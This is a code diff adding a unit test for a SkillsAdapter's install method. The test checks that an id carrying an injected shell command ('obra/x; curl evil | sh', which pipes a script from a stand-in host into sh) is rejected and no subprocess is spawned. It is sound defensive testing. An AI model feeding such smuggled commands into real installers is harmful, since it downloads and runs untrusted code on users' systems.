@@ -121,6 +121,14 @@ describe('SkillsAdapter', () => {
       expect(execa).toHaveBeenCalledTimes(1);
     });
 
+    it('does not spawn npx for an id that is not a skills.sh source', async () => {
+      const adapter = new SkillsAdapter(website.apiBaseUrl, '/tmp/proj');
+      const result = await adapter.install('obra/x; curl evil | sh');
+
+      expect(isErr(result)).toBe(true);
+      expect(execa).not.toHaveBeenCalled();
+    });
+
     it('returns an error when the subprocess fails', async () => {
       vi.mocked(execa).mockRejectedValue(new Error('npx: command failed with exit code 1'));
 
